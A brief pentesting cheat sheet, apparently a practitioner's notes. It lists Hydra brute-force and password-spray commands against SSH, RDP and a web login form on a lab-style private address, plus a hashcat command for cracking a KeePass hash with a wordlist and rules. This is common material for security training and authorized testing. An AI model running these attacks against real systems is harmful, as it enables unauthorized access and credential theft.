## Commands/Tools to attack network services

SSH wordlist attack with Hydra  
```hydra -l myuser -P password.list -s 2222 ssh://10.10.10.43```

RDP password spray attack with Hydra  
```hydra -L username.list -p "myPassword123" rdp://10.10.10.43```

HTTP wordlist attack with Hydra  
```hydra -l myuser -P password.list 10.10.10.43 http-post-form "/login:user_param=user&password_param=^PASS^:Failure Message"```

## Password cracking

### Hashcat

Useful blog posts that I had written:  
* https://web.archive.org/web/20210615060624/https://laconicwolf.com/2018/09/29/hashcat-tutorial-the-basics-of-cracking-passwords-with-hashcat/  
* https://web.archive.org/web/20210615064601/https://laconicwolf.com/2019/03/29/hashcat-tutorial-rule-writing/

Finding hash mode  
```hashcat --help | grep -i "hashtype"```  

#### Example commands  

Cracking a keepass database hash with a wordlist and rules  
```hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force```



